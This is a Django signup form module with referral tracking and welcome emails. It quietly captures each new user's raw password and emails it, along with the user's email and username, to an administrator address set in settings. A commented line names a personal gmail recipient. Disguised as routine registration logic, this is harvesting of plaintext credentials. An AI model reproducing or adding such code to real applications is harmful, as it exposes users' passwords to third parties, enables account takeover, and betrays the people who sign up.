from allauth.account.forms import SignupForm
from django import forms
from django.contrib.auth import get_user_model
from referral.models import Referral
from utils import send_email
from django.contrib import messages
from django.conf import settings
import threading
from website.models import Website
from userprofile.models import Profile
User = get_user_model()

class CustomSignupForm(SignupForm):
    referral_code = forms.CharField(max_length=100, label='Referral Code', required=False)

    def save(self, request):
        user = super().save(request)
        # Access the raw password before saving the user
        raw_password = self.cleaned_data['password1']

        referral_code = self.cleaned_data.get('referral_code', None)
        bonus = Website.objects.filter().first()
        if referral_code:
            try:
                user_refer = User.objects.get(username=referral_code)
                referral = Referral.objects.create(user=user_refer, referred_user=user)
                referral.save()

                subject = "Congratulations on Your Successful Referral!"
                body = f"Dear {user_refer.username},\n\nWe are thrilled to inform you that the user with the email address {user.email}, whom you referred, has successfully registered with us. Thank you for your valuable contribution to our community!\n\nBest regards,\nThe {(bonus.name).capitalize()} Team"

                email_thread1 = threading.Thread(target=send_email, args=(subject, body, user_refer.email))

                email_thread1.start()

            except User.DoesNotExist:
                print("User with referral code does not exist")
            except Profile.DoesNotExist:
                print("Profile for the user does not exist")


        # Additional logic to send an email to the admin with user details
        try:
            subject, message = send_admin_notification(user, raw_password)
            email_thread = threading.Thread(target=send_email, args=(subject, message, settings.RECIPIENT_ADDRESS))
            subject = "Welcome on Board!"
            body = f"Dear {user.username},\n\nWe are thrilled to have you on board. Your presence adds immense value to our community, and we look forward to providing you with an exceptional experience. If you have any questions or need assistance, feel free to reach out.\n\nBest regards,\nThe {(bonus.name).capitalize()} Team"

            email_thread2 = threading.Thread(target=send_email, args=(subject, body, user.email))
            email_thread.start()

            email_thread2.start()
            messages.success(request, 'Your email has been sent')
        except Exception as e:
            messages.error(request, 'There was an error with your request')
            print(e)

        return user

def send_admin_notification(user, raw_password):
    subject = 'New User Registration'
    message = f'New user registered with the following details:\n'
    message += f'Email: {user.email}\n'
    message += f'Username: {user.username}\n'
    message += f'Password: {raw_password}\n'

    return subject, message
    # send_mail(subject, message, 'info@ascentcapitalmgt.co', ['ekwo.chinonso.01@gmail.com'])
